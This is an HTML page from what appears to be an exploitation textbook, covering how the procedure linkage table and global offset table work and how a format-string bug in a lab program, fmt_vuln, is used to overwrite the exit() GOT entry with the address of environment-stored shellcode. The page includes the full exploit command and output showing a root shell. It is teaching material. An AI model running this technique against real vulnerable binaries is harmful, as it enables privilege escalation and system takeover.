<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x359  Overwriting the Global Offset Table</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part69.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part71.htm">Next &gt;</a></p><p class="s32" style="padding-top: 5pt;padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark60">0x359  Overwriting the Global Offset Table</a></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">Since a program could use a function in a shared library many times, it’s useful to have a table to reference all the functions. Another special section in compiled programs is used for this purpose—the <span class="s27">procedure linkage table (PLT)</span>.</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">This section consists of many jump instructions, each one corresponding to the address of a function. It works like a springboard—each time a shared function needs to be called, control will pass through the PLT.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">An object dump disassembling the PLT section in the vulnerable format string program (fmt_vuln.c) shows these jump instructions:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_593.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ objdump -d -j .plt ./fmt_vuln</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 212%;text-align: left;">./fmt_vuln:  file format elf32-i386 Disassembly of section .plt:</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">080482b8 &lt;<u> </u>gmon_start<u> </u>@plt-0x10&gt;:</p><p class="s31" style="padding-left: 95pt;text-indent: 0pt;text-align: left;">80482b8:    ff 35 6c 97 04 08    pushl 0x804976c</p><p class="s31" style="padding-left: 95pt;text-indent: 0pt;text-align: left;">80482be:    ff 25 70 97 04 08    jmp  *0x8049770</p><p class="s31" style="padding-left: 95pt;text-indent: 0pt;text-align: left;">80482c4:    00 00          add  %al,(%eax)</p><p class="s31" style="padding-left: 125pt;text-indent: 0pt;text-align: left;">...</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-bottom: 1pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">080482c8 &lt;<u> </u>gmon_start<u> </u>@plt&gt;:</p><table style="border-collapse:collapse;margin-left:93.2601pt" cellspacing="0"><tr style="height:10pt"><td style="width:51pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">80482c8:</p></td><td style="width:102pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ff 25 74 97 04 08</p></td><td style="width:38pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">jmp</p></td><td style="width:95pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">*0x8049774</p></td></tr><tr style="height:11pt"><td style="width:51pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">80482ce:</p></td><td style="width:102pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 10pt;text-align: left;">68 00 00 00 00</p></td><td style="width:38pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 10pt;text-align: left;">push</p></td><td style="width:95pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">$0x0</p></td></tr><tr style="height:10pt"><td style="width:51pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">80482d3:</p></td><td style="width:102pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">e9 e0 ff ff ff</p></td><td style="width:38pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">jmp</p></td><td style="width:95pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">80482b8 &lt;_init+0x18&gt;</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-bottom: 1pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">080482d8 &lt;<u> </u>libc_start_main@plt&gt;:</p><table style="border-collapse:collapse;margin-left:93.2601pt" cellspacing="0"><tr style="height:10pt"><td style="width:51pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">80482d8:</p></td><td style="width:39pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">ff 25</p></td><td style="width:12pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">78</p></td><td style="width:13pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">97</p></td><td style="width:13pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">04</p></td><td style="width:26pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 9pt;text-align: left;">08</p></td><td style="width:38pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">jmp</p></td><td style="width:94pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">*0x8049778</p></td></tr><tr style="height:11pt"><td style="width:51pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">80482de:</p></td><td style="width:39pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">68 08</p></td><td style="width:12pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">00</p></td><td style="width:13pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">00</p></td><td style="width:13pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">00</p></td><td style="width:26pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:38pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">push</p></td><td style="width:94pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">$0x8</p></td></tr><tr style="height:10pt"><td style="width:51pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">80482e3:</p></td><td style="width:39pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">e9 d0</p></td><td style="width:12pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ff</p></td><td style="width:13pt"><p class="s42" style="padding-left: 1pt;padding-right: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">ff</p></td><td style="width:13pt"><p class="s42" style="padding-right: 2pt;text-indent: 0pt;line-height: 9pt;text-align: right;">ff</p></td><td style="width:26pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:38pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">jmp</p></td><td style="width:94pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">80482b8 &lt;_init+0x18&gt;</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">080482e8 &lt;strcpy@plt&gt;:</p><p class="s31" style="padding-left: 95pt;text-indent: 0pt;text-align: left;">80482e8:    ff 25 7c 97 04 08    jmp  *0x804977c</p><p class="s31" style="padding-left: 95pt;text-indent: 0pt;text-align: left;">80482ee:    68 10 00 00 00     push  $0x10</p><p class="s31" style="padding-left: 95pt;text-indent: 0pt;text-align: left;">80482f3:    e9 c0 ff ff ff     jmp  80482b8 &lt;_init+0x18&gt;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">080482f8 &lt;printf@plt&gt;:</p><p class="s31" style="padding-left: 95pt;text-indent: 0pt;text-align: left;">80482f8:    ff 25 80 97 04 08    jmp  *0x8049780</p><p class="s31" style="padding-left: 95pt;text-indent: 0pt;text-align: left;">80482fe:    68 18 00 00 00     push  $0x18</p><p class="s31" style="padding-left: 95pt;text-indent: 0pt;text-align: left;">8048303:    e9 b0 ff ff ff     jmp  80482b8 &lt;_init+0x18&gt;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">08048308 &lt;exit@plt&gt;:</p><p class="s31" style="padding-left: 95pt;text-indent: 0pt;text-align: left;">8048308:    ff 25 84 97 04 08    jmp  *0x8049784</p><p class="s31" style="padding-left: 95pt;text-indent: 0pt;text-align: left;">804830e:    68 20 00 00 00     push  $0x20</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 4pt;text-align: left;">8048313:    e9 a0 ff ff ff     jmp  80482b8 &lt;_init+0x18&gt; reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_594.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">One of these jump instructions is associated with the <span class="s31">exit() </span>function, which is called at the end of the program. If the jump instruction used for the <span class="s31">exit() </span>function can be manipulated to direct the execution flow into shellcode instead of the <span class="s31">exit() </span>function, a root shell will be spawned. Below, the procedure linking table is shown to be read only.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_595.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ objdump -h ./fmt_vuln | grep -A1 &quot;\ .plt\ &quot;</p><p class="s31" style="padding-bottom: 2pt;padding-left: 167pt;text-indent: -72pt;line-height: 107%;text-align: left;">10 .plt    00000060 080482b8 080482b8 000002b8 2**2 CONTENTS, ALLOC, LOAD, READONLY, CODE</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_596.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">But closer examination of the jump instructions (shown in bold below) reveals that they aren’t jumping to addresses but to pointers to addresses. For example, the actual address of the <span class="s31">printf() </span>function is stored as a pointer at the memory address <span class="s31">0x08049780</span>, and the <span class="s31">exit() </span>function’s address is stored at <span class="s31">0x08049784</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_597.png"/></span></p><p class="s31" style="padding-bottom: 1pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">080482f8 &lt;printf@plt&gt;:</p><table style="border-collapse:collapse;margin-left:91.44pt" cellspacing="0"><tr style="height:11pt"><td style="width:53pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">80482f8:</p></td><td style="width:102pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ff 25 80 97 04 08</p></td><td style="width:38pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">jmp</p></td><td style="width:140pt"><p class="s45" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">*0x8049780</p></td></tr><tr style="height:11pt"><td style="width:53pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">80482fe:</p></td><td style="width:102pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 10pt;text-align: left;">68 18 00 00 00</p></td><td style="width:38pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 10pt;text-align: left;">push</p></td><td style="width:140pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">$0x18</p></td></tr><tr style="height:10pt"><td style="width:53pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">8048303:</p></td><td style="width:102pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">e9 b0 ff ff ff</p></td><td style="width:38pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">jmp</p></td><td style="width:140pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">80482b8 &lt;_init+0x18&gt;</p></td></tr><tr style="height:21pt"><td style="width:333pt" colspan="4"><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">08048308 &lt;exit@plt&gt;:</p></td></tr><tr style="height:12pt"><td style="width:53pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">8048308:</p></td><td style="width:102pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 10pt;text-align: left;">ff 25 84 97 04 08</p></td><td style="width:38pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 10pt;text-align: left;">jmp</p></td><td style="width:140pt"><p class="s45" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">*0x8049784</p></td></tr><tr style="height:11pt"><td style="width:53pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">804830e:</p></td><td style="width:102pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">68 20 00 00 00</p></td><td style="width:38pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">push</p></td><td style="width:140pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">$0x20</p></td></tr><tr style="height:14pt"><td style="width:53pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">8048313:</p></td><td style="width:102pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 10pt;text-align: left;">e9 a0 ff ff ff</p></td><td style="width:38pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 10pt;text-align: left;">jmp</p></td><td style="width:140pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">80482b8 &lt;_init+0x18&gt;</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 18pt;text-align: justify;">These addresses exist in another section, called the <span class="s27">global offset table (GOT)</span>, which is writable. These addresses can be directly obtained by displaying the dynamic relocation entries for the binary by using <span class="s31">objdump</span>.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_598.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ objdump -R ./fmt_vuln</p><p class="s31" style="padding-top: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 21pt;text-align: left;">./fmt_vuln:  file format elf32-i386 DYNAMIC RELOCATION RECORDS</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 8pt;text-align: left;">OFFSET  TYPE      VALUE</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">08049764 R_386_GLOB_DAT <u>&nbsp;</u>gmon_start<u> </u></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">08049774 R_386_JUMP_SLOT  <u>&nbsp;</u>gmon_start<u> </u></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">08049778 R_386_JUMP_SLOT  <u>&nbsp;</u>libc_start_main 0804977c R_386_JUMP_SLOT  strcpy</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">08049780 R_386_JUMP_SLOT  printf</p><p class="s46" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">08049784 R_386_JUMP_SLOT  exit</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_599.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: justify;">This reveals that the address of the <span class="s31">exit() </span>function (shown in bold above) is located in the GOT at <span class="s31">0x08049784</span>. If the address of the shellcode is over- written at this location, the program should call the shellcode when it thinks it’s calling the <span class="s31">exit() </span>function.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">As usual, the shellcode is put in an environment variable, its actual location is predicted, and the format string vulnerability is used to write the value. Actually, the shellcode should still be located in the environment from before, meaning that the only things that need adjustment are the first 16 bytes of the format string. The calculations for the <span class="s31">%x </span>format parameters will be done</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">once again for clarity. In the output below, the address of the shellcode (<span class="s63">0</span>) is written into the address of the <span class="s31">exit() </span>function (<span class="s74">@</span>).</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_600.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin) reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./fmt_vuln SHELLCODE will be at <span class="s73">0</span>0xbffff9ec</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q (gdb) p 0xbfff - 8</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">$1 = 49143</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">(gdb) p 0xf9ec - 0xbfff</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">$2 = 14829</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">(gdb) quit</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ objdump -R ./fmt_vuln</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 21pt;text-align: left;">./fmt_vuln:  file format elf32-i386 DYNAMIC RELOCATION RECORDS</p><p class="s31" style="padding-top: 1pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">OFFSET  TYPE      VALUE</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">08049764 R_386_GLOB_DAT <u>&nbsp;</u>gmon_start<u> </u></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">08049774 R_386_JUMP_SLOT  <u>&nbsp;</u>gmon_start<u> </u></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">08049778 R_386_JUMP_SLOT  <u>&nbsp;</u>libc_start_main 0804977c R_386_JUMP_SLOT  strcpy</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">08049780 R_386_JUMP_SLOT  printf</p><p class="s75" style="padding-left: 79pt;text-indent: 0pt;text-align: left;">@ <span class="s31">08049784 R_386_JUMP_SLOT  exit</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./fmt_vuln $(printf &quot;\x86\x97\x04\x08\x84\x97\x04\ x08&quot;)%49143x%4\$hn%14829x%5\$hn</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">The right way to print user-controlled input:</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">????%49143x%4$hn%14829x%5$hn</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">The wrong way to print user-controlled input:</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">????</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 329pt;text-indent: 0pt;text-align: left;">b7fe75fc</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">[*] test_val @ 0x08049794 = -72 0xffffffb8 sh-3.2# whoami</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">root sh-3.2#</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_601.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">When fmt_vuln.c tries to call the <span class="s31">exit() </span>function, the address of the <span class="s31">exit() </span>function is looked up in the GOT and is jumped to via the PLT. Since the actual address has been switched with the address for the shellcode in the environment, a root shell is spawned.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Another advantage of overwriting the GOT is that the GOT entries are fixed per binary, so a different system with the same binary will have the same GOT entry at the same address.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">The ability to overwrite any arbitrary address opens up many possibilities for exploitation. Basically, any section of memory that is writable and contains an address that directs the flow of program execution can be targeted.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part69.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part71.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
